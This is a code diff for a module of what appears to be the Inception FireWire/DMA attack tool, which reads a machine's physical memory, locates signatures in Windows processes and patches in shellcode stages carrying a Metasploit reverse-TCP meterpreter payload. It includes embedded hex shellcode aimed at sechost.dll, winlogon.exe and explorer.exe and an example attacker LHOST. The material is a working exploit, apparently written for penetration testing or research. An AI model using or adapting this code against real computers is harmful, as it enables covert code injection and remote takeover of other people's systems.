@@ -28,6 +28,7 @@ from inception.external.pymetasploit.metasploit.msfrpc import MsfRpcClient, MsfR
 from inception.external.pymetasploit.metasploit.msfconsole import MsfRpcConsole
 
 import collections
+import optparse
 import time
 import os
 
@@ -45,6 +46,28 @@ info = '''A description of the module goes here.'''
 #     - staged: Set to True if the signature need to be staged (allocate page)
 #     '''
 #     pass
+
+# Exit function hashes
+
+# kernel32.dll!SetUnhandledExceptionFilter (0xEA320EFE) - This exit function
+# will let the UnhandledExceptionFilter function perform its default handling
+# routine. 
+
+# kernel32.dll!ExitProcess (0x56A2B5F0) - This exit function will force the 
+# process to terminate.
+
+# kernel32.dll!ExitThread (0x0A2A1DE0) - This exit function will force the 
+# current thread to terminate. On Windows 2008, Vista and 7 this function is
+# a forwarded export to ntdll.dll!RtlExitUserThread and as such cannot be 
+# called by the api_call function.
+
+# ntdll.dll!RtlExitUserThread (0x6F721347) - This exit function will force 
+# the current thread to terminate. This function is not available on Windows 
+# NT or 2000.
+SEH = 0xea320efe        # kernel32.dll!SetUnhandledExceptionFilter
+PROCESS = 0x56a2b5f0    # kernel32.dll!ExitProcess
+THREAD = 0x0a2a1de0     # kernel32.dll!ExitThread
+USERTHREAD = 0x6f721347 # ntdll.dll!RtlExitUserThread
 
 stages = {
     'alloc_page': 
@@ -99,134 +122,162 @@ stage1 = Target(
             tag=False)
         ])
 
-stage2 = {
-'x86': Target(
-    name='Create and execute thread',
-    note='Create a new thread with the MSF payload, execute it, restore ' \
-         'stack and return to caller',
-    signatures=[
-        Signature(
-            offsets=[0],
-            chunks=[
-                Chunk(
-                    chunk=0xffe0000000000000,
-                    chunkoffset=0,
-                    patch=stages['alloc_page'],
-                    patchoffset=0)
-                ],
-            os='Windows 7',
-            os_versions=['SP0'],
-            os_architectures=['x86'],
-            executable='SearchIndexer.exe',
-            version='',
-            md5='',
-            tag=False)
-        ]),
-'x64': None}
+# stage2 = {
+# 'x86': Target(
+#     name='Create and execute thread',
+#     note='Create a new thread with the MSF payload, execute it, restore ' \
+#          'stack and return to caller',
+#     signatures=[
+#         Signature(
+#             offsets=[0],
+#             chunks=[
+#                 Chunk(
+#                     chunk=0xffe0000000000000,
+#                     chunkoffset=0,
+#                     patch=stages['alloc_page'],
+#                     patchoffset=0)
+#                 ],
+#             os='Windows 7',
+#             os_versions=['SP0'],
+#             os_architectures=['x86'],
+#             executable='SearchIndexer.exe',
+#             version='',
+#             md5='',
+#             tag=False)
+#         ]),
+# 'x64': None}
 
-def run():
+def add_options(parser):
+    parser.add_option('--msfopts', dest='msfopts',
+        help='exploit options in a comma-separated list using the format ' \
+        '\'OPTION=value\'')
+    parser.add_option('--msfpw', dest='msfpw',
+        help='password for the MSFRPC daemon')
 
-    # # Initialize
-    # # TODO: externalize this
-    # if not cfg.filemode:
-    #     try:
-    #         fw = firewire.FireWire()
-    #     except IOError:
-    #         term.fail('Could not initialize FireWire. Are the modules ' +
-    #                   'loaded into the kernel?')
-    #     start = time.time()
-    #     device_index = fw.select_device()
 
-    # # Lower DMA shield or use a file as input, and set memsize
-    # device = None
-    # memsize = None
-    # if cfg.filemode:
-    #     device = util.MemoryFile(cfg.filename, cfg.PAGESIZE)
-    #     memsize = os.path.getsize(cfg.filename)
-    # else:
-    #     elapsed = int(time.time() - start)
-    #     device = fw.getdevice(device_index, elapsed)
-    #     memsize = 2 * cfg.GiB
+def str2dict(str):
+    '''
+    Returns a dict from a string formatted as OPTION1=value,OPTION2=value
+    '''
+    return dict([x.split('=') for x in str.split(',')])
 
-    # memspace = MemorySpace(device, memsize)
 
-    # # Connect to msf and generate shellcode(s)
-    # try:
-    #     client = MsfRpcClient('abc123')
-    # except MsfRpcError as e:
-    #     term.fail(e)
+def set_opts(module, msfopts):
+    '''
+    Sets MSF options given the selected module
+    '''
+    if msfopts:
+        useropts = str2dict(msfopts)
+        for opt in useropts:
+            module[opt] = useropts[opt]
 
-    # name = term.poll('What MSF payload do you want to use?',
-    #     default='windows/meterpreter/reverse_tcp')
-    # try:
-    #     module = PayloadModule(client, name)
-    # except MsfRpcError as e:
-    #     term.fail(e)
+
+def set_exitfunc(payload, exitfunk):
+    '''
+    Sets the exitfunc of a payload by manipulating the binary string
+    '''
+    pass # TODO
+
+
+def run(opts):
+
+    # Initialize
+    # TODO: externalize this
+    if not opts.filename:
+        try:
+            fw = firewire.FireWire()
+        except IOError:
+            term.fail('Could not initialize FireWire. Are the modules ' +
+                      'loaded into the kernel?')
+        start = time.time()
+        device_index = fw.select_device()
+
+    # Lower DMA shield or use a file as input, and set memsize
+    device = None
+    memsize = None
+    if opts.filename:
+        device = util.MemoryFile(opts.filename, cfg.PAGESIZE)
+        memsize = os.path.getsize(opts.filename)
+    else:
+        elapsed = int(time.time() - start)
+        device = fw.getdevice(device_index, elapsed)
+        memsize = 2 * cfg.GiB
+
+    memspace = MemorySpace(device, memsize)
+
+    # Connect to msf and generate shellcode(s)
+    try:
+        client = MsfRpcClient(opts.msfpw)
+    except MsfRpcError as e:
+        term.fail(e)
+
+    name = term.poll('What MSF payload do you want to use?',
+        default='windows/meterpreter/reverse_tcp')
+    try:
+        module = PayloadModule(client, name)
+        set_opts(module, opts.msfopts)
+        payload = module.execute(Encoder='generic/none').get('payload') # **{'-t': 'raw'}
+    except MsfRpcError as e:
+        term.fail(e)
 
     
-    # # term.poll('Options:')
-    # # options = {'LHOST': 'localhost'}
-    # module['LHOST'] = '192.168.0.8'
-    # # module['ForceEncode'] = False
-    # # module['-t'] = 'raw'
-    # # opts = {'ForceEncode': False}
+    # term.poll('Options:')
+    # options = {'LHOST': 'localhost'}
+    #module['LHOST'] = '192.168.0.8'
+    # module['ForceEncode'] = False
+    # module['-t'] = 'raw'
+    # opts = {'ForceEncode': False}
     # try:
-    #     payload = module.execute(Encoder='generic/none').get('payload') # **{'-t': 'raw'}
+        
     # except MsfRpcError as e:
     #     term.fail(e)
 
-    # needed = [x for x in module.required if x not in module.advanced]
-    # # for o in module.advanced:
-    # #     print('{0}: {1}'.format(o, module[o]))
-    # # print('---')
-    # # for o in module.required:
-    # #     print('{0}: {1}'.format(o, module[o]))
-    # # print('---')
-    # for o in needed:
-    #     print('{0}: {1}'.format(o, module[o]))
-    # # print(payload)
-    # # print(util.bytes2hexstr(payload))
+    needed = [x for x in module.required if x not in module.advanced]
+    term.info('Selected options:')
+    for o in needed:
+        term.info('{0}: {1}'.format(o, module[o]))
+    
+    # print(payload)
+    # print(util.bytes2hexstr(payload))
 
-    # # Allow users to set required options
+    # TODO: Allow users to set required options
 
-    # # Search for signature and patch
-    # address, signature, offset, chunks = memspace.find(stage1)[0]
-    # # Signature found, let's patch
-    # # TODO: Externalize
-    # mask = 0xfffff000 # Mask away the lower bits to find the page number
-    # page = int((address & mask) / cfg.PAGESIZE)
-    # term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
-    # success, backup = memspace.patch(address, chunks)
+    # Search for signature and patch
+    address, signature, offset, chunks = memspace.find(stage1).pop()
+    # Signature found, let's patch
+    page = memspace.page_no(address)
+    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
+    success, backup = memspace.patch(address, chunks)
 
-    # # Figure out what os & architecture we're attacking and select stage
+    # Figure out what os & architecture we're attacking and select stage
+    # TODO: For now, just select x86
     # target = stage2[signature.os_architectures[0]]
 
-    # # Concatenate stage and payload
+    # Concatenate stages and payload
+    payload = stages['create_thread'] + stages['edit_reg'] + payload
 
-    # # Replace EXITFUNC with THREAD (it's hardcoded as PROCESS)
-    # # This helps ensure that the process doesn't crash if the exploit fails
+    # Replace EXITFUNC with THREAD (it's hardcoded as PROCESS)
+    # This helps ensure that the process doesn't crash if the exploit fails
 
-    # # Write back original page
-    # success = memspace.patch(address, backup)
+    # Write back original, backed up page
+    success = memspace.memory.write(address, backup)
+    # Search for the signature
+    address, signature, offset, chunks = memspace.rawfind(0, 0xffe0000000000000).pop()
+    # Signature found, let's patch
+    page = memspace.page_no(address)
+    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
+    success, backup = memspace.memory.write(address, payload)
 
-    # address, signature, offset, chunks = memspace.find(stage)[0]
-    # # Signature found, let's patch
-    # # TODO: Externalize
-    # mask = 0xfffff000 # Mask away the lower bits to find the page number
-    # page = int((address & mask) / cfg.PAGESIZE)
-    # term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
-    # success, backup = memspace.patch(address, ##)
+    # Copy off original memory content in the region where stage 1 will be written
 
-    # # Copy off original memory content in the region where stage 1 will be written
+    # Patch with stage 1 - allocates a memory page and writes signature to frame boundary, and jumps to it
 
-    # # Patch with stage 1 - allocates a memory page and writes signature to frame boundary, and jumps to it
+    # Search for signature
 
-    # # Search for signature
+    # Restore the original memory content where stage 1 was written (overwrite it)
 
-    # # Restore the original memory content where stage 1 was written (overwrite it)
-
-    # # Patch with stage 2 - forks / creates and executes a new thread with prepended shellcode
-    # exit(0)
+    # Patch with stage 2 - forks / creates and executes a new thread with prepended shellcode
+    exit(0)
     # Initialize and lower DMA shield
     if not cfg.filemode:
         try:
@@ -269,17 +320,17 @@ def run():
     #                                     'internaloffset': 0x00,
     #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd566c700ffe0ffe0,
     #                                     'patchoffset': 0x00}]}]}
-    # Test for sechost.dll
-    t = {'OS': 'Windows 7',
-            'versions': ['SP1'],
-            'architectures': ['x64'],
-            'name': 'sechost.dll',
-            'notes': 'w00t',
-            'signatures': [{'offsets': [0xdc6],
-                            'chunks': [{'chunk': 0x8bff558becff75088d450850,
-                                        'internaloffset': 0x00,
-                                        'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd566c700ffe0ffe0,
-                                        'patchoffset': 0x00}]}]}
+    # # Test for sechost.dll - finner denne men h;yt
+    # t = {'OS': 'Windows 7',
+    #         'versions': ['SP1'],
+    #         'architectures': ['x64'],
+    #         'name': 'sechost.dll',
+    #         'notes': 'w00t',
+    #         'signatures': [{'offsets': [0xdc6],
+    #                         'chunks': [{'chunk': 0x8bff558becff75088d450850,
+    #                                     'internaloffset': 0x00,
+    #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd566c700ffe0ffe0,
+    #                                     'patchoffset': 0x00}]}]}
     # Works except for network connection - best shot so far - this one works
     # t = {'OS': 'Windows 7',
     #         'versions': ['SP1'],
@@ -288,6 +339,28 @@ def run():
     #         'notes': 'w00t',
     #         'signatures': [{'offsets': [0x18c],
     #                         'chunks': [{'chunk': 0x8bff558bec813D,
+    #                                     'internaloffset': 0x00,
+    #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd566c700ffe0ffe0,
+    #                                     'patchoffset': 0x00}]}]}
+    # Test for winlogon.exe.dll
+    # t = {'OS': 'Windows 8',
+    #         'versions': ['SP1'],
+    #         'architectures': ['x64'],
+    #         'name': 'winlogon.exe',
+    #         'notes': 'w00t',
+    #         'signatures': [{'offsets': [0x2b0],
+    #                         'chunks': [{'chunk': 0x4C894424188954241048894C24085356,
+    #                                     'internaloffset': 0x00,
+    #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd566c700ffe0ffe0,
+    #                                     'patchoffset': 0x00}]}]}
+    # Test for explorer.exe
+    # t = {'OS': 'Windows 8',
+    #         'versions': ['SP1'],
+    #         'architectures': ['x64'],
+    #         'name': 'explorer.exe',
+    #         'notes': 'w00t',
+    #         'signatures': [{'offsets': [0x2b0],
+    #                         'chunks': [{'chunk': 0x4C894424188954241048894C24085356,
     #                                     'internaloffset': 0x00,
     #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd566c700ffe0ffe0,
     #                                     'patchoffset': 0x00}]}]}
